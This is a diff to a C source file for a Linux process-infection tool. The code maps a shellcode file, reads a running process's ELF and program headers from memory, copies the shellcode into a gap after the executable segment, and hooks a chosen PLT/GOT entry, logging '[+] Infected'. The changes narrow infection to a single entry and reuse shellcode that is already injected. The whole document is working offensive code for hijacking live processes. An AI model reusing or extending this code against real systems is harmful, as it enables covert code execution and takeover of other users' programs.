@@ -38,8 +38,9 @@ static int map_shellcode(const char *shellcode_path) {
 		close(fd);
 		return 0;
 	}
-	void *a = mmap(NULL, (size_t)statbuf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
 	
+	// st_size will be rounded up to page boundary by mmap, offset is 0.
+	void *a = mmap(NULL, (size_t)statbuf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);	
 	if(a == MAP_FAILED)  { close(fd); return 0; }
 	g_shellcode = (char*) a;
 	g_shellcodesize = (size_t)statbuf.st_size;
@@ -52,24 +53,26 @@ static int map_shellcode(const char *shellcode_path) {
  * the shellcode into an appropriate gap within target and returns the address of the shellcode.
  * If the object has already been infected the address of the already present shellcode is returned.
  * 
- * If the gap is not big enough for the shellcode this function fails.
+ * If the gap is not big enough for the shellcode this function fails, returning NULL.
  * 
  * */
 static void *inject_shellcode(TARGET *target, void *base_address) {
 	memory_region_t *regions = target->maps.regions;
 	uint32_t num_regions = target->maps.num_regions;
 	
-	// Find the region correspoding to base_address.
+	// Find the first region correspoding to base_address.
+	// this first region is assumed to be the Read Execute mapping.
+	// TODO Find it properly in case it's not. Most ELF's segment info is like that though.
 	memory_region_t *region = NULL;
 	for(size_t i = 0; i < num_regions; i++) {
 		if(regions[i].start_address == base_address) region = &regions[i];
 	}
 	
-	// if the region is already infected return ERROR. A region can only be infected once.
-	//if(region->shellcode_address) return NULL;
+	//if the region is already infected return already-existing shellcode address.
+	if(region->shellcode_address) return region->shellcode_address;
 	
 	// Copy ELF and program header for this region and store it in the region object for caching.
-	if(!region->pheader || !region->elfheader) {
+	if(!region->pheader && !region->elfheader) {
 		region->elfheader = xmalloc(sizeof(Elf64_Ehdr));
 		int res = ReadProcessMemory(target->pid, base_address, region->elfheader, sizeof(Elf64_Ehdr));
 		if(!res) {
@@ -107,7 +110,7 @@ static void *inject_shellcode(TARGET *target, void *base_address) {
 	// TODO: CHECK OFF BY ONE
 	size_t regionsize = ((size_t)region->end_address - (size_t)region->start_address)+1;
 	size_t gapsize = regionsize - firstload->p_memsz;
-	if(gapsize < g_shellcodesize) return NULL;
+	if(gapsize < g_shellcodesize) return NULL; // shellcode does not fit
 	void *gap_address = (void*)((size_t)region->start_address + firstload->p_memsz);
 	
 	// copy the shellcode into target
@@ -146,7 +149,7 @@ static int infect_entry(TARGET *target, size_t index) {
 }
 
 // TODO: Make infect() return error code or something...
-void infect(pid_t pid, size_t list[], size_t list_size, char *shellcode_path) {
+void infect(pid_t pid, int entry_num, char *shellcode_path) {
 	TARGET target;
 	
 	if(!target_init(&target, pid))
@@ -160,16 +163,12 @@ void infect(pid_t pid, size_t list[], size_t list_size, char *shellcode_path) {
 		
 	if(!target_parse_remote_elf(&target))
 		error(3, errno, "target_parse_remote_elf");
-			
-	for(size_t k=0; k<list_size; k++) {
-		size_t i = list[k];
-		//... TODO: CHECK INDEX HERE.
-		if(!infect_entry(&target, i)) {
-			fprintf(stderr, "[-] Cannot infect #%lu %s@%s\n", i, 
-				target.pltgot_entries[i].symname, target.pltgot_entries[i].module);
-		} else {
-			fprintf(stderr, "[+] Infected #%lu %s@%s\n", i, 
-				target.pltgot_entries[i].symname, target.pltgot_entries[i].module);
-		}
+	
+	if(!infect_entry(&target, entry_num)) {
+		fprintf(stderr, "[-] Cannot infect #%d %s@%s\n", entry_num,
+			target.pltgot_entries[entry_num].symname, target.pltgot_entries[entry_num].module);
+	} else {
+		fprintf(stderr, "[+] Infected #%d %s@%s\n", entry_num,
+			target.pltgot_entries[entry_num].symname, target.pltgot_entries[entry_num].module);
 	}
 }
